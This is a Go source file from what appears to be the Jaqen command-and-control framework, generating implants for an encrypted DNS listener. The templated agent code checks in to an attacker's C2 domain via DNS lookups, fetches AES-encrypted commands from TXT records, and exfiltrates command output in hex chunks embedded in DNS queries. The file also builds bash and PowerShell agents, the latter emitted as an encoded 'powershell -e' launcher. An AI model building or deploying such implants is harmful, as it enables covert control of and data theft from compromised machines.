package encryptedDNSListener

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strconv"
	"text/template"

	"github.com/c-sto/Jaqen/libJaqen/server"
	"github.com/gobuffalo/packr"
	"golang.org/x/text/encoding/unicode"
)

func (d JaqenEncryptedDNSListener) genGolangAgent() []byte {
	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
	dom, _ := d.GetOption("domain")
	b64key, _ := d.GetOption("key")

	codeStruct := server.AgentCode{

		Imports: `*/
		_ "crypto/sha256"	
		"crypto/aes"
		"crypto/cipher"
		"crypto"
		"crypto/hmac"
		csrand "crypto/rand"
		"encoding/base64"
		"encoding/hex"
		"errors"
		"bytes"
		"fmt"
		"net"
		"os"
		/*`,
		GlobalVars: `
		*/const payloadSizeMax = 62

		func encrypt(plaintext, key []byte) ([]byte, error) {
			block, e := aes.NewCipher(key)
			if e != nil {
				return []byte{}, e
			}
			iv, e := generateRandomBytes(aes.BlockSize)
		
			mode := cipher.NewCBCEncrypter(block, iv) //, iv []byte) NewGCM(block) //, iv)
		
			pt, e := pkcs7Pad([]byte(plaintext), aes.BlockSize)
			ct := make([]byte, len(pt))
		
			mode.CryptBlocks(ct, pt)
		
			ct = append(iv, ct...)
		
			//authenticate
			mac := hmac.New(crypto.SHA256.New, key)
			mac.Write(ct)
			mmac := mac.Sum(nil)
		
			ct = append(mmac, ct...)
			return ct, nil
		}
		var (
			// ErrInvalidBlockSize indicates hash blocksize <= 0.
			ErrInvalidBlockSize = errors.New("invalid blocksize")
		
			// ErrInvalidPKCS7Data indicates bad input to PKCS7 pad or unpad.
			ErrInvalidPKCS7Data = errors.New("invalid PKCS7 data (empty or not padded)")
		
			// ErrInvalidPKCS7Padding indicates PKCS7 unpad fails to bad input.
			ErrInvalidPKCS7Padding = errors.New("invalid padding on input")
		)
		func pkcs7Pad(b []byte, blocksize int) ([]byte, error) {
			if blocksize <= 0 {
				return nil, nil
			}
			if b == nil || len(b) == 0 {
				return nil, ErrInvalidPKCS7Data
			}
			n := blocksize - (len(b) % blocksize)
			pb := make([]byte, len(b)+n)
			copy(pb, b)
			copy(pb[len(b):], bytes.Repeat([]byte{byte(n)}, n))
			return pb, nil
		}
		
		func pkcs7Unpad(b []byte, blocksize int) ([]byte, error) {
			if blocksize <= 0 {
				return nil, ErrInvalidBlockSize
			}
			if b == nil || len(b) == 0 {
				return nil, ErrInvalidPKCS7Data
			}
			if len(b)%blocksize != 0 {
				return nil, ErrInvalidPKCS7Padding
			}
			c := b[len(b)-1]
			n := int(c)
			if n == 0 || n > len(b) {
				return nil, ErrInvalidPKCS7Padding
			}
			for i := 0; i < n; i++ {
				if b[len(b)-n+i] != c {
					return nil, ErrInvalidPKCS7Padding
				}
			}
			return b[:len(b)-n], nil
		}

		func generateRandomBytes(n int) ([]byte, error) {
			b := make([]byte, n)
			_, err := csrand.Read(b)
			// Note that err == nil only if we read len(b) bytes.
			if err != nil {
				return nil, err
			}
		
			return b, nil
		}
		
		func decrypt(ct, key []byte) ([]byte, error) {
			ctmac := ct[:crypto.SHA256.Size()]

			mac := hmac.New(crypto.SHA256.New, key)
			mac.Write(ct[crypto.SHA256.Size():])
			ourmac := mac.Sum(nil)
		
			if !hmac.Equal(ctmac, ourmac) {
				return []byte{}, errors.New("HMAC Fail")
			}
		
			ct = ct[crypto.SHA256.Size():]
		
			block, e := aes.NewCipher(key)
			if e != nil {
				return []byte{}, e
			}
		
			mode := cipher.NewCBCDecrypter(block, ct[:aes.BlockSize]) //NewGCM(block) //, iv)
			if e != nil {
				return []byte{}, e
			}
		
			ct = ct[aes.BlockSize:]
			pt := make([]byte, len(ct))
		
			mode.CryptBlocks(pt, ct)
		
			//unpad
			pt, e = pkcs7Unpad(pt, aes.BlockSize)
		
			return pt, e
		}
		
		func decryptToString(ct, key []byte) (string, error) {
			pt, e := decrypt(ct, key)
			if e != nil {
				return "", e
			}
			return string(pt), nil
		}
		
		func decryptHexStringToString(ct string, ekey string) (string, error) {
			decodedCt, e := hex.DecodeString(ct)
			if e != nil {
				return "", e
			}
		
			key, e := base64.StdEncoding.DecodeString(ekey)
			if e != nil {
				return "", e
			}
		
			return decryptToString(decodedCt, key)
		}
/*
`,
		Checkin: `*/	
		net.LookupIP(a.uid + "." + a.settings.Get("c2Domain"))
		/*`,
		Init: `*/	
		a.settings.Set("c2Domain", "` + dom + `")
		a.settings.Set("key", "` + b64key + `")
		/*`,
		GetCommand: `*/
		cmdID := RandStringRunes(4)
		lookupAddr := fmt.Sprintf("%s.%s.%s", cmdID, a.uid, a.settings.Get("c2Domain"))
		command, err := net.LookupTXT(lookupAddr)
		if err != nil {
			os.Exit(0)
		}
	
		scmd := strings.Join(command, "")
		//decode and decrypt
	
		scmd, _ = decryptHexStringToString(scmd, a.settings.Get("key"))
	
		a.cmd, a.cmdID = scmd, cmdID
	
		if a.cmd != "NoCMD" {
			return true
		}
		if a.cmd == "exit" {
			os.Exit(0)
		}
		/*`,
		ExecCommand: `*//*`,
		SendResponse: `*/	
		k := a.GetSetting("key")
		dk, _ := base64.StdEncoding.DecodeString(k)
	
		b, _ = encrypt(b, dk) //, iv)
	
		encodedResult := hex.EncodeToString(b)
		blocks := len(encodedResult) / payloadSizeMax
		leftover := len(encodedResult) % payloadSizeMax
		if leftover > 0 {
			blocks++
		}
	
		for x := 1; x <= blocks; x++ {
			minVal := (x - 1) * payloadSizeMax
			maxVal := x * payloadSizeMax
			if maxVal > len(encodedResult) {
				maxVal = len(encodedResult)
			}
			payload := encodedResult[minVal:maxVal]
			chunknumber := x
			maxChunks := blocks
			lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s.%s", payload, chunknumber, maxChunks, a.cmdID, a.uid, a.GetSetting("c2Domain"))
	
			go func() {
				for {
					x, err := net.LookupIP(lookupaddr)
					if err != nil {
						continue
					}
					z := net.ParseIP("127.0.0.1")
					if z.Equal(x[0]) {
						break
					}
					time.Sleep(time.Duration(3)*time.Second) //arbitrary sleep retry value (1 was too low, got repeated responses)
				}
			}()
	
		}
		/*`,
	}

	codeStruct.AVoid("")

	boxs, err := packr.NewBox("../../../").MustString("agent/agent.go")
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	code, err := template.New("goagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	var buf bytes.Buffer

	err = code.Execute(&buf, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	binDir, err := ioutil.TempDir("", "jaqen-build")

	if err != nil {
		fmt.Println(err)
	}

	workingDir := path.Join(binDir, "agent.go")

	fmt.Println("working", workingDir)
	codeFile, err := os.Create(workingDir)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Generating code to: " + codeFile.Name())

	err = code.Execute(codeFile, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	cgo, err := d.GetOption("cgo")
	if err != nil {
		cgo = "0"
	}
	goos, err := d.GetOption("goos")
	if err != nil {
		goos = "windows"
	}
	goarch, err := d.GetOption("goarch")
	if err != nil {
		goos = "x64"
	}

	outfile, _ := d.GetOption("outfile")

	buildr := []string{"build"}
	if outfile != "" {
		buildr = append(buildr, "-o")
		buildr = append(buildr, outfile)
	}

	goroot := server.GetGoRoot()
	gopath := server.GetGoPath()

	err = server.GoCmd(server.GoConfig{
		CGO:    cgo,
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: goroot,
		GOPATH: gopath,
	},
		binDir,
		buildr,
	)

	if err != nil {
		fmt.Println(err)
		return []byte{}
	}

	return []byte{} //buf.Bytes()
}

type powershellagent struct {
	Domain string
	Split  int
	Key    string
}

func (d JaqenEncryptedDNSListener) genBashAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("bashdnsagent.sh")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("bashdnsagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	return buf.String()
}

func (d JaqenEncryptedDNSListener) genPowershellAgent() string {
	dom, _ := d.GetOption("domain")
	key, _ := d.GetOption("key")
	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
		Key:    key,
	}
	boxs, err := packr.NewBox("./").MustString("encryptedDNSAgent.ps1")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("dnsagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	x, _ := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder().String(buf.String())
	return "powershell -e " + base64.StdEncoding.EncodeToString([]byte(x))
	//return x //buf.String()
}
